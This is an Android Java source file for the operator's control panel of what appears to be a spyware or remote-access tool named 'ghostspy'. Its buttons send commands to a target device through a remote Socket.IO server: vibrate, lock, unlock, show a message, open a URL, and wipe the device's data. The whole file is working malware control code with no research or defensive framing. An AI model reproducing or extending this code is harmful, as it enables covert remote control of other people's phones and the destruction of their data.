package com.testapp;

import android.app.Activity;
import android.app.AlertDialog;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.LinearLayout;
import android.widget.Toast;
import io.socket.client.IO;
import io.socket.client.Socket;
import org.json.JSONObject;
import java.net.URISyntaxException;

public class ControlActivity extends Activity {
    private Socket socket;
    private String deviceId;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        deviceId = getIntent().getStringExtra("deviceId");

        LinearLayout layout = new LinearLayout(this);
        layout.setOrientation(LinearLayout.VERTICAL);
        layout.setBackgroundColor(0xFF0B0E17);
        layout.setPadding(32, 32, 32, 32);

        // Tombol-tombol kontrol
        addButton(layout, "📳 Vibrate", () -> sendCmd("vibrate"));
        addButton(layout, "🔒 Lock", () -> sendCmd("lock"));
        addButton(layout, "🔓 Unlock", () -> sendCmd("unlock"));
        addButton(layout, "📢 Toast", () -> {
            showInputDialog("Teks Toast", text -> sendCmd("toast", new JSONObject() {{
                try { put("text", text); } catch (Exception e) {}
            }}));
        });
        addButton(layout, "🌐 Open URL", () -> {
            showInputDialog("URL", url -> sendCmd("openurl", new JSONObject() {{
                try { put("url", url); } catch (Exception e) {}
            }}));
        });
        addButton(layout, "💣 Wipe Data", () -> sendCmd("wipe"));

        setContentView(layout);

        try {
            socket = IO.socket("https://ghostspy.bruang.biz.id");
            socket.connect();
        } catch (URISyntaxException e) {
            Toast.makeText(this, "Socket error", Toast.LENGTH_SHORT).show();
        }
    }

    private void addButton(LinearLayout parent, String text, Runnable action) {
        Button btn = new Button(this);
        btn.setText(text);
        btn.setTextColor(0xFFFFFFFF);
        btn.setBackgroundColor(0xFF1A1A2E);
        btn.setOnClickListener(v -> action.run());
        LinearLayout.LayoutParams params = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT);
        params.setMargins(0, 0, 0, 12);
        btn.setLayoutParams(params);
        parent.addView(btn);
    }

    private void sendCmd(String cmd) {
        sendCmd(cmd, new JSONObject());
    }

    private void sendCmd(String cmd, JSONObject params) {
        if (socket != null && socket.connected()) {
            JSONObject msg = new JSONObject();
            try {
                msg.put("device_id", deviceId);
                msg.put("command", cmd);
                msg.put("params", params);
                socket.emit("command", msg);
                Toast.makeText(this, "✅ " + cmd, Toast.LENGTH_SHORT).show();
            } catch (Exception e) {}
        } else {
            Toast.makeText(this, "❌ Offline", Toast.LENGTH_SHORT).show();
        }
    }

    private void showInputDialog(String title, InputCallback callback) {
        AlertDialog.Builder builder = new AlertDialog.Builder(this);
        builder.setTitle(title);
        EditText input = new EditText(this);
        builder.setView(input);
        builder.setPositiveButton("OK", (d, w) -> callback.onInput(input.getText().toString()));
        builder.setNegativeButton("Batal", null);
        builder.show();
    }

    interface InputCallback { void onInput(String input); }
}
